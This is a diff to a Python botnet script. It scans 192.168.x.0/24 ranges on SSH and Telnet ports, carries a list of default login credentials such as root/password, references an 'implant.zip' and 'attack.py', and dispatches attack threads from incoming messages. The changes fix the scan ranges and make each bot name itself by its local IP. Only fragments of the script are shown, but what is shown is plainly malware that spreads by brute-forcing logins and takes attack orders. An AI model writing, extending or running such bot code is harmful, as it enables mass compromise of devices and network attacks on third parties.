@@ -13,7 +13,6 @@ import sys
 
 from random import randint, choice, shuffle
 from scapy.all import IP, TCP, sr1, RandShort, DNS, DNSQR, UDP
-from uuid import getnode as get_mac
 
 MY_IP = "0.0.0.0"
 UDP_PORT = "9191"
@@ -22,13 +21,13 @@ LOCK_FILE = '/tmp/b'
 ATK_FILE = "attack.py"
 IMPL_FILE = "implant.zip"
 
-SCAN_NETWORK = ['192.168.1.1/24', '192.168.2.1/24', '192.168.3.1/24', '192.168.4.1/24', '192.168.5.1/24', '192.168.6.1/24', '192.168.7.1/24']
+SCAN_NETWORK = ['192.168.1.0/24', '192.168.2.0/24', '192.168.3.0/24', '192.168.4.0/24', '192.168.5.0/24', '192.168.6.0/24', '192.168.7.0/24']
 SCAN_PORT = [22, 23]
 SCAN_RATE = 1
 OPEN_IPS = {}
 LOCK = Lock()
 
-MODULE = 'bot_'+str(get_mac())
+MODULE = 'bot_'+str(randint(1000, 99999))
 
 CRED_LIST = [
     ("root","password"),
@@ -290,8 +289,18 @@ def handle_msg(i_transport, i_data, i_addr):
     t = attack(code, ip, port)
     t.start()
 
+def get_my_ip():
+    global MY_IP, MODULE
+    f = os.popen("ip a | grep 'scope global' | awk '{ print $NF }'")
+    local_eth = f.read().rstrip()
+    f = os.popen('ifconfig {} | grep "inet" | cut -d: -f2 | cut -d" " -f1'.format(local_eth))
+    # Keep some verifier, see the returned item is ok or not.
+    MY_IP = f.read().rstrip()
+    MODULE = 'bot_'+MY_IP
 
 kill_processes()
+
+get_my_ip()
 
 signal.signal(signal.SIGHUP, signal.SIG_IGN)
 signal.signal(signal.SIGINT, int_handler)
